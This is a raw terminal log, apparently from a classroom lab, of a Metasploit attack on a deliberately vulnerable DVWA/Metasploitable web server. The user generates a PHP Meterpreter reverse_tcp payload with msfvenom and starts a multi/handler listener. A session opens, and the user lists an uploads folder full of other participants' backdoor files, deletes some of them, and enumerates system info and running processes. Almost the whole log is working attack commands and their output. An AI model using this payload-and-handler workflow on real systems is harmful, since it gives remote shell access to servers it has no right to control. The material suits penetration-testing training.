@@ -1,0 +1,855 @@
+root@kali:~# updatedb
+root@kali:~# msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=12345 -f -raw -o /root/Desktop/amit_php.php
+Error: Invalid Format Selected
+root@kali:~# msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=12345 -f raw -o /root/Desktop/amit_php.php
+[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+[-] No arch selected, selecting arch: php from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 1114 bytes
+Saved as: /root/Desktop/amit_php.php
+root@kali:~# msfconsole -q
+msf > use multi/handler
+msf exploit(multi/handler) > use php/meterpreter/reverse_tcp
+msf payload(php/meterpreter/reverse_tcp) > set payload php/meterpreter/reverse_tcp
+payload => php/meterpreter/reverse_tcp
+msf payload(php/meterpreter/reverse_tcp) > show options
+
+Module options (payload/php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+msf payload(php/meterpreter/reverse_tcp) > set LHOST 192.168.1.10
+LHOST => 192.168.1.10
+msf payload(php/meterpreter/reverse_tcp) > set LPORT 12345
+LPORT => 12345
+msf payload(php/meterpreter/reverse_tcp) > show options
+
+Module options (payload/php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.1.10     yes       The listen address (an interface may be specified)
+   LPORT  12345            yes       The listen port
+
+msf payload(php/meterpreter/reverse_tcp) > exploit -j
+[-] Unknown command: exploit.
+msf payload(php/meterpreter/reverse_tcp) > exploit -j
+[-] Unknown command: exploit.
+msf payload(php/meterpreter/reverse_tcp) > exit
+root@kali:~# use multi/handler
+bash: use: command not found
+root@kali:~# msfconsole -q
+msf > use multi/handler
+msf exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
+payload => php/meterpreter/reverse_tcp
+msf exploit(multi/handler) > set LHOST 192.168.1.10
+LHOST => 192.168.1.10
+msf exploit(multi/handler) > set LPORT 12345
+LPORT => 12345
+msf exploit(multi/handler) > show options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.1.10     yes       The listen address (an interface may be specified)
+   LPORT  12345            yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+msf exploit(multi/handler) > exploit -j
+[*] Exploit running as background job 0.
+
+[*] Started reverse TCP handler on 192.168.1.10:12345 
+msf exploit(multi/handler) > jobs
+
+Jobs
+====
+
+  Id  Name                    Payload                      Payload opts
+  --  ----                    -------                      ------------
+  0   Exploit: multi/handler  php/meterpreter/reverse_tcp  tcp://192.168.1.10:12345
+
+msf exploit(multi/handler) > sessions
+
+Active sessions
+===============
+
+No active sessions.
+
+msf exploit(multi/handler) > sessions
+
+Active sessions
+===============
+
+No active sessions.
+
+msf exploit(multi/handler) > 
+[*] Sending stage (37775 bytes) to 192.168.1.43
+[*] Meterpreter session 1 opened (192.168.1.10:12345 -> 192.168.1.43:55978) at 2019-08-04 16:08:38 +0530
+
+msf exploit(multi/handler) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information                     Connection
+  --  ----  ----                   -----------                     ----------
+  1         meterpreter php/linux  www-data (33) @ metasploitable  192.168.1.10:12345 -> 192.168.1.43:55978 (192.168.1.43)
+
+msf exploit(multi/handler) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > ?
+
+Core Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    bgkill                    Kills a background meterpreter script
+    bglist                    Lists running background scripts
+    bgrun                     Executes a meterpreter script as a background thread
+    channel                   Displays information or control active channels
+    close                     Closes a channel
+    disable_unicode_encoding  Disables encoding of unicode strings
+    enable_unicode_encoding   Enables encoding of unicode strings
+    exit                      Terminate the meterpreter session
+    get_timeouts              Get the current session timeout values
+    guid                      Get the session GUID
+    help                      Help menu
+    info                      Displays information about a Post module
+    irb                       Drop into irb scripting mode
+    load                      Load one or more meterpreter extensions
+    machine_id                Get the MSF ID of the machine attached to the session
+    migrate                   Migrate the server to another process
+    quit                      Terminate the meterpreter session
+    read                      Reads data from a channel
+    resource                  Run the commands stored in a file
+    run                       Executes a meterpreter script or Post module
+    sessions                  Quickly switch to another session
+    set_timeouts              Set the current session timeout values
+    sleep                     Force Meterpreter to go quiet, then re-establish session.
+    transport                 Change the current transport mechanism
+    use                       Deprecated alias for "load"
+    uuid                      Get the UUID for the current session
+    write                     Writes data to a channel
+
+
+Stdapi: File system Commands
+============================
+
+    Command       Description
+    -------       -----------
+    cat           Read the contents of a file to the screen
+    cd            Change directory
+    checksum      Retrieve the checksum of a file
+    cp            Copy source to destination
+    dir           List files (alias for ls)
+    download      Download a file or directory
+    edit          Edit a file
+    getlwd        Print local working directory
+    getwd         Print working directory
+    lcd           Change local working directory
+    lls           List local files
+    lpwd          Print local working directory
+    ls            List files
+    mkdir         Make directory
+    mv            Move source to destination
+    pwd           Print working directory
+    rm            Delete the specified file
+    rmdir         Remove directory
+    search        Search for files
+    upload        Upload a file or directory
+
+
+Stdapi: Networking Commands
+===========================
+
+    Command       Description
+    -------       -----------
+    portfwd       Forward a local port to a remote service
+
+
+Stdapi: System Commands
+=======================
+
+    Command       Description
+    -------       -----------
+    execute       Execute a command
+    getenv        Get one or more environment variable values
+    getpid        Get the current process identifier
+    getuid        Get the user that the server is running as
+    kill          Terminate a process
+    localtime     Displays the target system's local date and time
+    pgrep         Filter processes by name
+    pkill         Terminate processes by name
+    ps            List running processes
+    shell         Drop into a system command shell
+    sysinfo       Gets information about the remote system, such as OS
+
+
+Stdapi: Audio Output Commands
+=============================
+
+    Command       Description
+    -------       -----------
+    play          play an audio file on target system, nothing written on disk
+
+meterpreter > ls
+Listing: /var/www/dvwa/hackable/uploads
+=======================================
+
+Mode              Size   Type  Last modified              Name
+----              ----   ----  -------------              ----
+100600/rw-------  15     fil   2019-08-04 15:52:02 +0530  1.txt
+100600/rw-------  9      fil   2019-08-04 15:52:27 +0530  123.txt
+100600/rw-------  3026   fil   2019-08-04 15:51:56 +0530  Avinash.php
+100600/rw-------  1113   fil   2019-08-04 16:07:59 +0530  Avinash_phpbackdoor.php
+100600/rw-------  1113   fil   2019-08-04 16:03:40 +0530  CBDragon_DB.php
+100600/rw-------  1114   fil   2019-08-04 16:08:01 +0530  Mallik_phpBD.php
+100600/rw-------  386    fil   2019-08-04 15:52:17 +0530  Notes_04082019.txt
+100600/rw-------  1114   fil   2019-08-04 16:08:57 +0530  VIC_phpbackdoor.php
+100600/rw-------  1112   fil   2019-08-04 16:08:05 +0530  ZABI_phpbackdoor.php
+100600/rw-------  424    fil   2019-08-04 15:59:01 +0530  abc.php
+100600/rw-------  1113   fil   2019-08-04 16:08:09 +0530  ajay_ajay.php
+100600/rw-------  73802  fil   2019-08-04 15:52:16 +0530  amit.exe
+100600/rw-------  207    fil   2019-08-04 15:57:15 +0530  amit_linuxbackdoor.elf
+100600/rw-------  1114   fil   2019-08-04 16:07:01 +0530  amit_php.php
+100600/rw-------  1114   fil   2019-08-04 16:08:19 +0530  amitj_phpbackdoor.php
+100600/rw-------  1114   fil   2019-08-04 16:08:02 +0530  amreet_phpbackdoor.php
+100600/rw-------  1113   fil   2019-08-04 16:08:25 +0530  ank1.php
+100600/rw-------  1113   fil   2019-08-04 16:08:18 +0530  asim_phpbackdoor.php
+100600/rw-------  1113   fil   2019-08-04 16:08:43 +0530  batman.php
+100644/rw-r--r--  667    fil   2012-05-21 00:52:48 +0530  dvwa_email.png
+100600/rw-------  207    fil   2019-08-04 15:52:15 +0530  dvwa_prit.elf
+100600/rw-------  6      fil   2019-08-04 15:52:38 +0530  hello.txt
+100600/rw-------  73802  fil   2019-08-04 15:51:55 +0530  hina.exe
+100600/rw-------  1111   fil   2019-08-04 16:08:29 +0530  hina_phpbackdoor.php
+100600/rw-------  17     fil   2019-08-04 15:51:59 +0530  host.txt
+100600/rw-------  1114   fil   2019-08-04 16:08:16 +0530  jab.php
+100600/rw-------  1114   fil   2019-08-04 16:08:12 +0530  jaga_phpbcdr.php
+100600/rw-------  1114   fil   2019-08-04 16:08:26 +0530  jay_phpbackdoor.php
+100600/rw-------  207    fil   2019-08-04 15:47:39 +0530  jitu_linuxbackdoor.elf
+100600/rw-------  6814   fil   2019-08-04 15:49:48 +0530  kali.jpg
+100600/rw-------  1114   fil   2019-08-04 16:08:13 +0530  kavya_backdoor.php
+100600/rw-------  1113   fil   2019-08-04 16:08:07 +0530  lokibackdoor.php
+100600/rw-------  1113   fil   2019-08-04 16:08:10 +0530  mereena_phpbackdoor.php
+100600/rw-------  207    fil   2019-08-04 15:47:46 +0530  mukund.elf
+100600/rw-------  207    fil   2019-08-04 15:45:44 +0530  nemesis.elf
+100600/rw-------  21     fil   2019-08-04 15:48:37 +0530  open.txt
+100600/rw-------  75     fil   2019-08-04 15:56:14 +0530  passwords.txt
+100600/rw-------  1114   fil   2019-08-04 16:08:02 +0530  pritam_phpbackdoor.php
+100600/rw-------  6      fil   2019-08-04 15:51:55 +0530  read.txt
+100600/rw-------  1116   fil   2019-08-04 16:08:10 +0530  sachin.php
+100600/rw-------  1114   fil   2019-08-04 16:08:45 +0530  shark_phpbackdoor.php
+100600/rw-------  1113   fil   2019-08-04 16:08:20 +0530  singhchandransin2.php
+100600/rw-------  1114   fil   2019-08-04 16:08:50 +0530  soumya_phpbackdoor.php
+100600/rw-------  1113   fil   2019-08-04 16:08:21 +0530  sridhar_phpbackdoor.php
+100600/rw-------  1114   fil   2019-08-04 16:08:05 +0530  sumit_phpbackdoor1.php
+100600/rw-------  14     fil   2019-08-04 15:52:49 +0530  test.txt
+100600/rw-------  1113   fil   2019-08-04 16:08:06 +0530  test3.php
+100600/rw-------  307    fil   2019-08-04 15:52:53 +0530  textfile.txt
+100600/rw-------  1114   fil   2019-08-04 16:08:25 +0530  tri.php
+100600/rw-------  58     fil   2019-08-04 15:58:23 +0530  username.txt
+100600/rw-------  55     fil   2019-08-04 15:57:52 +0530  usernames.txt
+100600/rw-------  1114   fil   2019-08-04 16:08:29 +0530  vinil_phpbackdoor.php
+100600/rw-------  1112   fil   2019-08-04 16:07:40 +0530  viv.php
+100600/rw-------  207    fil   2019-08-04 15:56:58 +0530  wol.elf
+100600/rw-------  3043   fil   2019-08-04 15:53:27 +0530  zabi_phpbackdoor.php
+
+meterpreter > rm Avinash_phpbackdoor.php
+meterpreter > ls
+Listing: /var/www/dvwa/hackable/uploads
+=======================================
+
+Mode              Size   Type  Last modified              Name
+----              ----   ----  -------------              ----
+100600/rw-------  15     fil   2019-08-04 15:52:02 +0530  1.txt
+100600/rw-------  9      fil   2019-08-04 15:52:27 +0530  123.txt
+100600/rw-------  3026   fil   2019-08-04 15:51:56 +0530  Avinash.php
+100600/rw-------  1113   fil   2019-08-04 16:03:40 +0530  CBDragon_DB.php
+100600/rw-------  1114   fil   2019-08-04 16:09:17 +0530  Mallik_phpBD.php
+100600/rw-------  386    fil   2019-08-04 15:52:17 +0530  Notes_04082019.txt
+100600/rw-------  1114   fil   2019-08-04 16:08:57 +0530  VIC_phpbackdoor.php
+100600/rw-------  1112   fil   2019-08-04 16:08:05 +0530  ZABI_phpbackdoor.php
+100600/rw-------  424    fil   2019-08-04 15:59:01 +0530  abc.php
+100600/rw-------  1113   fil   2019-08-04 16:08:09 +0530  ajay_ajay.php
+100600/rw-------  73802  fil   2019-08-04 15:52:16 +0530  amit.exe
+100600/rw-------  207    fil   2019-08-04 15:57:15 +0530  amit_linuxbackdoor.elf
+100600/rw-------  1114   fil   2019-08-04 16:07:01 +0530  amit_php.php
+100600/rw-------  1114   fil   2019-08-04 16:08:19 +0530  amitj_phpbackdoor.php
+100600/rw-------  1114   fil   2019-08-04 16:08:02 +0530  amreet_phpbackdoor.php
+100600/rw-------  1113   fil   2019-08-04 16:08:25 +0530  ank1.php
+100600/rw-------  1113   fil   2019-08-04 16:08:18 +0530  asim_phpbackdoor.php
+100600/rw-------  1113   fil   2019-08-04 16:08:43 +0530  batman.php
+100644/rw-r--r--  667    fil   2012-05-21 00:52:48 +0530  dvwa_email.png
+100600/rw-------  207    fil   2019-08-04 15:52:15 +0530  dvwa_prit.elf
+100600/rw-------  6      fil   2019-08-04 15:52:38 +0530  hello.txt
+100600/rw-------  73802  fil   2019-08-04 15:51:55 +0530  hina.exe
+100600/rw-------  1111   fil   2019-08-04 16:08:29 +0530  hina_phpbackdoor.php
+100600/rw-------  17     fil   2019-08-04 15:51:59 +0530  host.txt
+100600/rw-------  1114   fil   2019-08-04 16:08:16 +0530  jab.php
+100600/rw-------  1114   fil   2019-08-04 16:08:12 +0530  jaga_phpbcdr.php
+100600/rw-------  1114   fil   2019-08-04 16:08:26 +0530  jay_phpbackdoor.php
+100600/rw-------  1114   fil   2019-08-04 16:09:09 +0530  jit_jitu_phpbackdoor.php
+100600/rw-------  207    fil   2019-08-04 15:47:39 +0530  jitu_linuxbackdoor.elf
+100600/rw-------  6814   fil   2019-08-04 15:49:48 +0530  kali.jpg
+100600/rw-------  1114   fil   2019-08-04 16:08:13 +0530  kavya_backdoor.php
+100600/rw-------  1113   fil   2019-08-04 16:08:07 +0530  lokibackdoor.php
+100600/rw-------  1113   fil   2019-08-04 16:08:10 +0530  mereena_phpbackdoor.php
+100600/rw-------  207    fil   2019-08-04 15:47:46 +0530  mukund.elf
+100600/rw-------  207    fil   2019-08-04 15:45:44 +0530  nemesis.elf
+100600/rw-------  1113   fil   2019-08-04 16:09:07 +0530  nemesis.php
+100600/rw-------  21     fil   2019-08-04 15:48:37 +0530  open.txt
+100600/rw-------  75     fil   2019-08-04 15:56:14 +0530  passwords.txt
+100600/rw-------  1114   fil   2019-08-04 16:08:02 +0530  pritam_phpbackdoor.php
+100600/rw-------  6      fil   2019-08-04 15:51:55 +0530  read.txt
+100600/rw-------  1116   fil   2019-08-04 16:08:10 +0530  sachin.php
+100600/rw-------  1114   fil   2019-08-04 16:08:45 +0530  shark_phpbackdoor.php
+100600/rw-------  1113   fil   2019-08-04 16:08:20 +0530  singhchandransin2.php
+100600/rw-------  1114   fil   2019-08-04 16:08:50 +0530  soumya_phpbackdoor.php
+100600/rw-------  1113   fil   2019-08-04 16:08:21 +0530  sridhar_phpbackdoor.php
+100600/rw-------  1114   fil   2019-08-04 16:08:05 +0530  sumit_phpbackdoor1.php
+100600/rw-------  14     fil   2019-08-04 15:52:49 +0530  test.txt
+100600/rw-------  1113   fil   2019-08-04 16:08:06 +0530  test3.php
+100600/rw-------  307    fil   2019-08-04 15:52:53 +0530  textfile.txt
+100600/rw-------  1114   fil   2019-08-04 16:08:25 +0530  tri.php
+100600/rw-------  58     fil   2019-08-04 15:58:23 +0530  username.txt
+100600/rw-------  55     fil   2019-08-04 15:57:52 +0530  usernames.txt
+100600/rw-------  1114   fil   2019-08-04 16:08:29 +0530  vinil_phpbackdoor.php
+100600/rw-------  1112   fil   2019-08-04 16:07:40 +0530  viv.php
+100600/rw-------  207    fil   2019-08-04 15:56:58 +0530  wol.elf
+100600/rw-------  3043   fil   2019-08-04 15:53:27 +0530  zabi_phpbackdoor.php
+
+meterpreter > rm Avinash.php
+meterpreter > sysinfo
+Computer    : metasploitable
+OS          : Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
+Meterpreter : php/linux
+meterpreter > ?
+
+Core Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    bgkill                    Kills a background meterpreter script
+    bglist                    Lists running background scripts
+    bgrun                     Executes a meterpreter script as a background thread
+    channel                   Displays information or control active channels
+    close                     Closes a channel
+    disable_unicode_encoding  Disables encoding of unicode strings
+    enable_unicode_encoding   Enables encoding of unicode strings
+    exit                      Terminate the meterpreter session
+    get_timeouts              Get the current session timeout values
+    guid                      Get the session GUID
+    help                      Help menu
+    info                      Displays information about a Post module
+    irb                       Drop into irb scripting mode
+    load                      Load one or more meterpreter extensions
+    machine_id                Get the MSF ID of the machine attached to the session
+    migrate                   Migrate the server to another process
+    quit                      Terminate the meterpreter session
+    read                      Reads data from a channel
+    resource                  Run the commands stored in a file
+    run                       Executes a meterpreter script or Post module
+    sessions                  Quickly switch to another session
+    set_timeouts              Set the current session timeout values
+    sleep                     Force Meterpreter to go quiet, then re-establish session.
+    transport                 Change the current transport mechanism
+    use                       Deprecated alias for "load"
+    uuid                      Get the UUID for the current session
+    write                     Writes data to a channel
+
+
+Stdapi: File system Commands
+============================
+
+    Command       Description
+    -------       -----------
+    cat           Read the contents of a file to the screen
+    cd            Change directory
+    checksum      Retrieve the checksum of a file
+    cp            Copy source to destination
+    dir           List files (alias for ls)
+    download      Download a file or directory
+    edit          Edit a file
+    getlwd        Print local working directory
+    getwd         Print working directory
+    lcd           Change local working directory
+    lls           List local files
+    lpwd          Print local working directory
+    ls            List files
+    mkdir         Make directory
+    mv            Move source to destination
+    pwd           Print working directory
+    rm            Delete the specified file
+    rmdir         Remove directory
+    search        Search for files
+    upload        Upload a file or directory
+
+
+Stdapi: Networking Commands
+===========================
+
+    Command       Description
+    -------       -----------
+    portfwd       Forward a local port to a remote service
+
+
+Stdapi: System Commands
+=======================
+
+    Command       Description
+    -------       -----------
+    execute       Execute a command
+    getenv        Get one or more environment variable values
+    getpid        Get the current process identifier
+    getuid        Get the user that the server is running as
+    kill          Terminate a process
+    localtime     Displays the target system's local date and time
+    pgrep         Filter processes by name
+    pkill         Terminate processes by name
+    ps            List running processes
+    shell         Drop into a system command shell
+    sysinfo       Gets information about the remote system, such as OS
+
+
+Stdapi: Audio Output Commands
+=============================
+
+    Command       Description
+    -------       -----------
+    play          play an audio file on target system, nothing written on disk
+
+meterpreter > ls
+Listing: /var/www/dvwa/hackable/uploads
+=======================================
+
+Mode              Size   Type  Last modified              Name
+----              ----   ----  -------------              ----
+100600/rw-------  15     fil   2019-08-04 15:52:02 +0530  1.txt
+100600/rw-------  9      fil   2019-08-04 15:52:27 +0530  123.txt
+100600/rw-------  1113   fil   2019-08-04 16:03:40 +0530  CBDragon_DB.php
+100600/rw-------  1114   fil   2019-08-04 16:09:17 +0530  Mallik_phpBD.php
+100600/rw-------  386    fil   2019-08-04 15:52:17 +0530  Notes_04082019.txt
+100600/rw-------  1114   fil   2019-08-04 16:08:57 +0530  VIC_phpbackdoor.php
+100600/rw-------  1112   fil   2019-08-04 16:08:05 +0530  ZABI_phpbackdoor.php
+100600/rw-------  424    fil   2019-08-04 15:59:01 +0530  abc.php
+100600/rw-------  1114   fil   2019-08-04 16:11:36 +0530  absence_php.php
+100600/rw-------  1113   fil   2019-08-04 16:08:09 +0530  ajay_ajay.php
+100600/rw-------  73802  fil   2019-08-04 15:52:16 +0530  amit.exe
+100600/rw-------  207    fil   2019-08-04 15:57:15 +0530  amit_linuxbackdoor.elf
+100600/rw-------  1114   fil   2019-08-04 16:07:01 +0530  amit_php.php
+100600/rw-------  1114   fil   2019-08-04 16:08:19 +0530  amitj_phpbackdoor.php
+100600/rw-------  1114   fil   2019-08-04 16:08:02 +0530  amreet_phpbackdoor.php
+100600/rw-------  1113   fil   2019-08-04 16:08:25 +0530  ank1.php
+100600/rw-------  1113   fil   2019-08-04 16:08:18 +0530  asim_phpbackdoor.php
+100600/rw-------  1113   fil   2019-08-04 16:11:00 +0530  batman.php
+100600/rw-------  1112   fil   2019-08-04 16:09:46 +0530  dj_phpbackdoor.php
+100644/rw-r--r--  667    fil   2012-05-21 00:52:48 +0530  dvwa_email.png
+100600/rw-------  207    fil   2019-08-04 15:52:15 +0530  dvwa_prit.elf
+100600/rw-------  6      fil   2019-08-04 15:52:38 +0530  hello.txt
+100600/rw-------  73802  fil   2019-08-04 15:51:55 +0530  hina.exe
+100600/rw-------  1111   fil   2019-08-04 16:08:29 +0530  hina_phpbackdoor.php
+100600/rw-------  17     fil   2019-08-04 15:51:59 +0530  host.txt
+100600/rw-------  1114   fil   2019-08-04 16:08:16 +0530  jab.php
+100600/rw-------  1114   fil   2019-08-04 16:08:12 +0530  jaga_phpbcdr.php
+100600/rw-------  1114   fil   2019-08-04 16:08:26 +0530  jay_phpbackdoor.php
+100600/rw-------  1114   fil   2019-08-04 16:09:09 +0530  jit_jitu_phpbackdoor.php
+100600/rw-------  207    fil   2019-08-04 15:47:39 +0530  jitu_linuxbackdoor.elf
+100600/rw-------  6814   fil   2019-08-04 15:49:48 +0530  kali.jpg
+100600/rw-------  1114   fil   2019-08-04 16:10:00 +0530  kamesh_phpbackdoor.php
+100600/rw-------  1114   fil   2019-08-04 16:11:08 +0530  kavya_backdoor.php
+100600/rw-------  1113   fil   2019-08-04 16:08:07 +0530  lokibackdoor.php
+100600/rw-------  1113   fil   2019-08-04 16:08:10 +0530  mereena_phpbackdoor.php
+100600/rw-------  207    fil   2019-08-04 15:47:46 +0530  mukund.elf
+100600/rw-------  207    fil   2019-08-04 15:45:44 +0530  nemesis.elf
+100600/rw-------  1113   fil   2019-08-04 16:09:07 +0530  nemesis.php
+100600/rw-------  21     fil   2019-08-04 15:48:37 +0530  open.txt
+100600/rw-------  75     fil   2019-08-04 15:56:14 +0530  passwords.txt
+100600/rw-------  1114   fil   2019-08-04 16:08:02 +0530  pritam_phpbackdoor.php
+100600/rw-------  6      fil   2019-08-04 15:51:55 +0530  read.txt
+100600/rw-------  1116   fil   2019-08-04 16:08:10 +0530  sachin.php
+100600/rw-------  1114   fil   2019-08-04 16:08:45 +0530  shark_phpbackdoor.php
+100600/rw-------  1113   fil   2019-08-04 16:08:20 +0530  singhchandransin2.php
+100600/rw-------  1114   fil   2019-08-04 16:08:50 +0530  soumya_phpbackdoor.php
+100600/rw-------  1113   fil   2019-08-04 16:08:21 +0530  sridhar_phpbackdoor.php
+100600/rw-------  1114   fil   2019-08-04 16:08:05 +0530  sumit_phpbackdoor1.php
+100600/rw-------  1114   fil   2019-08-04 16:09:32 +0530  suvojit_phpbackdoor.php
+100600/rw-------  14     fil   2019-08-04 15:52:49 +0530  test.txt
+100600/rw-------  1113   fil   2019-08-04 16:08:06 +0530  test3.php
+100600/rw-------  307    fil   2019-08-04 15:52:53 +0530  textfile.txt
+100600/rw-------  1114   fil   2019-08-04 16:08:25 +0530  tri.php
+100600/rw-------  55     fil   2019-08-04 15:57:52 +0530  usernames.txt
+100600/rw-------  1114   fil   2019-08-04 16:08:29 +0530  vinil_phpbackdoor.php
+100600/rw-------  1112   fil   2019-08-04 16:07:40 +0530  viv.php
+100600/rw-------  207    fil   2019-08-04 15:56:58 +0530  wol.elf
+100600/rw-------  3043   fil   2019-08-04 15:53:27 +0530  zabi_phpbackdoor.php
+
+meterpreter > 
+meterpreter > 
+meterpreter > 
+meterpreter > ?
+
+Core Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    bgkill                    Kills a background meterpreter script
+    bglist                    Lists running background scripts
+    bgrun                     Executes a meterpreter script as a background thread
+    channel                   Displays information or control active channels
+    close                     Closes a channel
+    disable_unicode_encoding  Disables encoding of unicode strings
+    enable_unicode_encoding   Enables encoding of unicode strings
+    exit                      Terminate the meterpreter session
+    get_timeouts              Get the current session timeout values
+    guid                      Get the session GUID
+    help                      Help menu
+    info                      Displays information about a Post module
+    irb                       Drop into irb scripting mode
+    load                      Load one or more meterpreter extensions
+    machine_id                Get the MSF ID of the machine attached to the session
+    migrate                   Migrate the server to another process
+    quit                      Terminate the meterpreter session
+    read                      Reads data from a channel
+    resource                  Run the commands stored in a file
+    run                       Executes a meterpreter script or Post module
+    sessions                  Quickly switch to another session
+    set_timeouts              Set the current session timeout values
+    sleep                     Force Meterpreter to go quiet, then re-establish session.
+    transport                 Change the current transport mechanism
+    use                       Deprecated alias for "load"
+    uuid                      Get the UUID for the current session
+    write                     Writes data to a channel
+
+
+Stdapi: File system Commands
+============================
+
+    Command       Description
+    -------       -----------
+    cat           Read the contents of a file to the screen
+    cd            Change directory
+    checksum      Retrieve the checksum of a file
+    cp            Copy source to destination
+    dir           List files (alias for ls)
+    download      Download a file or directory
+    edit          Edit a file
+    getlwd        Print local working directory
+    getwd         Print working directory
+    lcd           Change local working directory
+    lls           List local files
+    lpwd          Print local working directory
+    ls            List files
+    mkdir         Make directory
+    mv            Move source to destination
+    pwd           Print working directory
+    rm            Delete the specified file
+    rmdir         Remove directory
+    search        Search for files
+    upload        Upload a file or directory
+
+
+Stdapi: Networking Commands
+===========================
+
+    Command       Description
+    -------       -----------
+    portfwd       Forward a local port to a remote service
+
+
+Stdapi: System Commands
+=======================
+
+    Command       Description
+    -------       -----------
+    execute       Execute a command
+    getenv        Get one or more environment variable values
+    getpid        Get the current process identifier
+    getuid        Get the user that the server is running as
+    kill          Terminate a process
+    localtime     Displays the target system's local date and time
+    pgrep         Filter processes by name
+    pkill         Terminate processes by name
+    ps            List running processes
+    shell         Drop into a system command shell
+    sysinfo       Gets information about the remote system, such as OS
+
+
+Stdapi: Audio Output Commands
+=============================
+
+    Command       Description
+    -------       -----------
+    play          play an audio file on target system, nothing written on disk
+
+meterpreter > ps
+
+Process List
+============
+
+ PID   Name                                  User      Path
+ ---   ----                                  ----      ----
+ 1     /sbin/init                            root      /sbin/init
+ 2     [kthreadd]                            root      [kthreadd]
+ 3     [migration/0]                         root      [migration/0]
+ 4     [ksoftirqd/0]                         root      [ksoftirqd/0]
+ 5     [watchdog/0]                          root      [watchdog/0]
+ 6     [events/0]                            root      [events/0]
+ 7     [khelper]                             root      [khelper]
+ 41    [kblockd/0]                           root      [kblockd/0]
+ 48    [kseriod]                             root      [kseriod]
+ 98    [pdflush]                             root      [pdflush]
+ 99    [pdflush]                             root      [pdflush]
+ 100   [kswapd0]                             root      [kswapd0]
+ 141   [aio/0]                               root      [aio/0]
+ 1099  [ksnapd]                              root      [ksnapd]
+ 1256  [ata/0]                               root      [ata/0]
+ 1262  [ata_aux]                             root      [ata_aux]
+ 1269  [ksuspend_usbd]                       root      [ksuspend_usbd]
+ 1275  [khubd]                               root      [khubd]
+ 1281  [scsi_eh_0]                           root      [scsi_eh_0]
+ 1287  [scsi_eh_1]                           root      [scsi_eh_1]
+ 2145  [kjournald]                           root      [kjournald]
+ 2322  /sbin/udevd                           root      /sbin/udevd --daemon
+ 2493  [kpsmoused]                           root      [kpsmoused]
+ 3479  dhclient3                             dhcp      dhclient3 -e IF_METRIC=100 -pf /var/run/dhclient.eth0.pid -lf /var/lib/dhcp3/dhclient.eth0.leases eth0
+ 3531  [kjournald]                           root      [kjournald]
+ 3670  /sbin/portmap                         daemon    /sbin/portmap
+ 3688  /sbin/rpc.statd                       statd     /sbin/rpc.statd
+ 3694  [rpciod/0]                            root      [rpciod/0]
+ 3709  /usr/sbin/rpc.idmapd                  root      /usr/sbin/rpc.idmapd
+ 3936  /sbin/getty                           root      /sbin/getty 38400 tty4
+ 3937  /sbin/getty                           root      /sbin/getty 38400 tty5
+ 3942  /sbin/getty                           root      /sbin/getty 38400 tty2
+ 3944  /sbin/getty                           root      /sbin/getty 38400 tty3
+ 3947  /sbin/getty                           root      /sbin/getty 38400 tty6
+ 3987  /sbin/syslogd                         syslog    /sbin/syslogd -u syslog
+ 4023  /bin/dd                               root      /bin/dd bs 1 if /proc/kmsg of /var/run/klogd/kmsg
+ 4025  /sbin/klogd                           klog      /sbin/klogd -P /var/run/klogd/kmsg
+ 4050  /usr/sbin/named                       bind      /usr/sbin/named -u bind
+ 4074  /usr/sbin/sshd                        root      /usr/sbin/sshd
+ 4156  /bin/sh                               root      /bin/sh /usr/bin/mysqld_safe
+ 4198  /usr/sbin/mysqld                      mysql     /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=mysql --pid-file=/var/run/mysqld/mysqld.pid --skip-external-locking --port=3306 --socket=/var/run/mysqld/mysqld.sock
+ 4200  logger                                root      logger -p daemon.err -t mysqld_safe -i -t mysqld
+ 4279  /usr/lib/postgresql/8.3/bin/postgres  postgres  /usr/lib/postgresql/8.3/bin/postgres -D /var/lib/postgresql/8.3/main -c config_file=/etc/postgresql/8.3/main/postgresql.conf
+ 4282  postgres:                             postgres  postgres: writer process
+ 4283  postgres:                             postgres  postgres: wal writer process
+ 4284  postgres:                             postgres  postgres: autovacuum launcher process
+ 4285  postgres:                             postgres  postgres: stats collector process
+ 4306  distccd                               daemon    distccd --daemon --user daemon --allow 0.0.0.0/0
+ 4307  distccd                               daemon    distccd --daemon --user daemon --allow 0.0.0.0/0
+ 4361  [lockd]                               root      [lockd]
+ 4362  [nfsd4]                               root      [nfsd4]
+ 4363  [nfsd]                                root      [nfsd]
+ 4364  [nfsd]                                root      [nfsd]
+ 4365  [nfsd]                                root      [nfsd]
+ 4366  [nfsd]                                root      [nfsd]
+ 4367  [nfsd]                                root      [nfsd]
+ 4368  [nfsd]                                root      [nfsd]
+ 4369  [nfsd]                                root      [nfsd]
+ 4370  [nfsd]                                root      [nfsd]
+ 4374  /usr/sbin/rpc.mountd                  root      /usr/sbin/rpc.mountd
+ 4442  /usr/lib/postfix/master               root      /usr/lib/postfix/master
+ 4443  pickup                                postfix   pickup -l -t fifo -u -c
+ 4445  qmgr                                  postfix   qmgr -l -t fifo -u
+ 4450  /usr/sbin/nmbd                        root      /usr/sbin/nmbd -D
+ 4452  /usr/sbin/smbd                        root      /usr/sbin/smbd -D
+ 4456  /usr/sbin/smbd                        root      /usr/sbin/smbd -D
